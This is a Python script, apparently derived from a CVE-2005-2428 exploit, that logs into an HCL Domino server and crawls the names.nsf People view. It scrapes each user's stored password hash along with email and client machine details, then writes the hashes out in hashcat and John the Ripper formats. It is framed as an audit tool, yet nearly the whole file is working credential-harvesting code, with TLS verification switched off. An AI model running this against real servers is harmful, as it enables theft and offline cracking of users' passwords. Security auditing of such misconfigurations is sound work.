#!/usr/local/bin/python3

# Title: HCL Domino Password Hash Extraction Tool
# Author: Christian Brandlehner
# Date: 11-01-2024
# Tested on: HCL Domino 14.0
# Credits:
#   Jonathan Broche
#   Alexander Schwankner
#   https://github.com/schwankner/CVE-2005-2428-IBM-Lotus-Domino-R8-Password-Hash-Extraction-Exploit/blob/master/exploit.py
#
# HCL Domino is a very secure platform by default.
# However, configuration mistakes can lead to insecure installations.
# This tool is intended to be used by auditors or Domino-Administrators to check if the configuration is according to best practices.
#
# Read this to understand Domino Internet Passwords:
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_more_secure_password_format.html
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_xacls_to_secure_internet_passwords.html
#
# Domino also supports protection against brute force attacks and support one-time-passwords:
# https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_internet_password_lockout.html
# https://help.hcltechsw.com/domino/14.0.0/admin/conf_totp_overview.html
#
# With Domino you can use Passkey authentication
# https://help.hcltechsw.com/domino/14.0.0/admin/conf_dominopasskeyauth.html
#
# INSTALLATION
# you may need to install these libaries for a local python3 installation:
# pip3 install request
# pip3 install beautifulsoup4

import argparse
import csv
import getpass
import re
import sys
from bs4 import BeautifulSoup
import requests

requests.packages.urllib3.disable_warnings()
parser = argparse.ArgumentParser(description='HCL Domino password hash extraction tool')
VERSION = '3.0'
parser.add_argument('--version', action='version', version=VERSION)
parser.add_argument('system', help="IP address or hostname. ")
parser.add_argument('-n', '--username', metavar='username')
parser.add_argument('-u', '--uri', metavar='path', default="/names.nsf",
                    help="Path to the names.nsf file. [Default: /names.nsf]")
outgroup = parser.add_argument_group(title="Output Options")
outgroup.add_argument('--hashcat', action='store_true', help="Print results for use with hashcat.")
outgroup.add_argument('--john', action='store_true', help="Print results for use with John the Ripper.")
parser.add_argument('-f', '--file', metavar='outputPath', help="Output file in given format. Defaults to <system>.txt")
parser.add_argument('-c', '--csv', metavar='CSV file with many information about the user. Defaults to <system>.csv')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

# Check if the required argument is provided
if not getattr(args, 'system', None):
    parser.error('The "system" argument is required.')
    sys.exit(1)

if not getattr(args, 'username', None):
    parser.error('The "username" argument is required.')
    sys.exit(1)


print("\nHCL Domino Hash Extration Tool {}\n".format(VERSION))
print("\n")
print("HCL Domino is a very secure platform by default.")
print("However, configuration mistakes can lead to insecure installations.")
print("This tool is intended to be used by auditors or Domino-Administrators to check if the configuration is according to best practices.")
print("Read this to understand Domino Internet Passwords:")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_more_secure_password_format.html")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_xacls_to_secure_internet_passwords.html")
print("Domino also supports protection against brute force attacks and support one-time-passwords:")
print("https://help.hcltechsw.com/domino/14.0.0/admin/secu_using_internet_password_lockout.html")
print("https://help.hcltechsw.com/domino/14.0.0/admin/conf_totp_overview.html")
print("With Domino you can use Passkey authentication")
print("https://help.hcltechsw.com/domino/14.0.0/admin/conf_dominopasskeyauth.html")

password = getpass.getpass(prompt='Password: ', stream=None)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3926.54 Safari/537.36'
}

postData = {'Password': password, 'Username': args.username, 'RedirectTo': '/names.nsf/People?OpenView'}

with requests.Session() as s:
    try:
        response = s.post("https://{}{}?Login".format(args.system, args.uri), verify=False, headers=headers,
                          timeout=3, data=postData)
        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
    except requests.exceptions.RequestException as e:
                print("Request error:", e)
                sys.exit(1)
                # Handle other types of request errors here if needed
    else:
        if response.status_code == 200:  # Check if the request was successful
            soup = BeautifulSoup(response.text, 'html.parser')
        else:
            raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))

    print ("Authentication successful. HTTP status code 200 after login. Username and password seem to be correct.")
    hashes = {}
    start = 1
    
    filepath = args.file or args.system + ".txt"
    file = open(filepath, 'w')
    algorithm = "not detected"
    if args.csv:
        csvfilepath = args.csv or args.system + ".csv"
        csvFile = open(csvfilepath, 'w')
        fieldnames = ['name', 'hash', 'algorithm', 'email', 'ClntMachine', 'ClntPltfrm', 'ClntBld',
                      'HTTPPasswordChangeDate']
        csvWriter = csv.DictWriter(csvFile, fieldnames=fieldnames, dialect='excel')
        csvWriter.writeheader()

    # adjust as needed
    max_iterations = 2
    i = 0
    while i < max_iterations:
        try:
            response = s.get("https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start),
                         verify=False, headers=headers, timeout=3)
            response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
        except requests.exceptions.Timeout as e:
            print("[!] Timed out after 3 seconds. Try again if this is a temporary problem.")
            print("URL used: https://{}{}/People?OpenView&Start={}".format(args.system, args.uri, start))
            sys.exit(1)
        except requests.exceptions.RequestException as e:
            print("Request error:", e)
            sys.exit(1)
            # Handle other types of request errors here if needed
        else:
            if response.status_code == 200:  # Check if the request was successful
                soup = BeautifulSoup(response.text, 'html.parser')
            else:
                raise SystemExit("Unexpected HTTP status code: {}".format(response.status_code))

        print("Success reading the first page of users from the Domino Directory. HTTP status code is 200")
        soup = BeautifulSoup(response.text, 'html.parser')

        start = start + 30
        # will need an update with other versions or languages of HCL Domino
        if 'Keine Dokumente gefunden' in response.text:
            print("keine Dokumente gefunden")
            break
        if 'No Document found' in response.text:
            print("No Document found")
            break

        links = []
        print("Success, there seem to be user documents in the view.")
        # grab all user profile links
        for link in soup.findAll('a'):
            if "OpenDocument" in link['href']:
                if link['href'] not in links:
                    links.append(link['href'])

        for link in links:  # get user document
            try:
                response = s.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=3)
                response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)
            except requests.exceptions.Timeout as e:
                print("Timeout error:", e)
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                # Handle other types of request errors here if needed
            else:
                if response.status_code == 200:  # Check if the request was successful
                    soup = BeautifulSoup(response.text, 'html.parser')
                else:
                    print("Unexpected HTTP status code:", response.status_code)

                name = soup.find('input', {'name': 'InternetAddress'}).get('value').strip()# InternetAddress
                if not name:
                    name = soup.find('input', {'name': 'DisplayName'}).get('value').strip()#     # If InternetAddress is empty use DisplayName instead.
                httppassword_input = soup.find('input', {"name": "dspHTTPPassword"})
                if httppassword_input:
                    httppassword = httppassword_input.get('value').strip()
                else:
                    httppassword = ""

                dsphttppassword_input = soup.find('input', {"name": "PasswordDigest"})
                if dsphttppassword_input:
                    dsphttppassword = dsphttppassword_input.get('value').strip()
                else:
                    dsphttppassword = ""

                email = soup.find('input', {"name": "InternetAddress"}).get('value').strip()
                ClntMachine = soup.find('input', {"name": "ClntMachine"}).get('value').strip()
                ClntBld = soup.find('input', {"name": "ClntBld"}).get('value').strip()
                ClntPltfrm = soup.find('input', {"name": "ClntPltfrm"}).get('value').strip()
                HTTPPasswordChangeDate = soup.find('input', {"name": "HTTPPasswordChangeDate"}).get('value').strip()

                hash_value = ""
                if httppassword:
                    hash_value = httppassword
                elif dsphttppassword:
                    hash_value = dsphttppassword # If httppassword is empty but dsphttppassword is set, use dsphttppassword
                else:
                    print('No password hash found for user:',name)

                # Increment the iteration count
                i += 1

                if hash_value:
                    # Match regex to determine hash algorithm
                    if re.match(r"^[a-f0-9]{32}$", hash_value):
                        algorithm = 'Domino 5'
                    elif re.match(r"^\([A-Za-z0-9+/]{20}\)$", hash_value):
                        algorithm = 'Domino 6'
                    elif re.match(r"^\([A-Za-z0-9+/]{49}\)$", hash_value):
                        algorithm = 'Domino 8 or later'
                    else:
                        algorithm = 'Hash algorithm not detected'
                    print("Algorithm:", algorithm)
                    if args.csv:
                        csvWriter.writerow(
                        {'name': name,
                         'hash': hash_value,
                         'algorithm': algorithm,
                         'email': email,
                         'ClntMachine': ClntMachine,
                         'ClntPltfrm': ClntPltfrm,
                         'ClntBld': ClntBld,
                         'HTTPPasswordChangeDate': HTTPPasswordChangeDate})

                    print((str(i) + " " + name + " : " + hash_value))
                    if args.hashcat or args.john:
                        if args.hashcat:
                            file.write(hash_value + "\n")
                        if args.john:
                            file.write("{}:{}\n".format(name, hash_value))
                    else:
                        file.write("[*] User: {} Hash: {}".format(name, hash_value))

    print()
    if args.csv:
        csvFile.close()
        print(("extended account information written to " + csvfilepath))
    file.close()
    print(("hashes written to " + filepath + " with hashing algorithm: " + algorithm))  # I assume all users have the same hashing algorithm
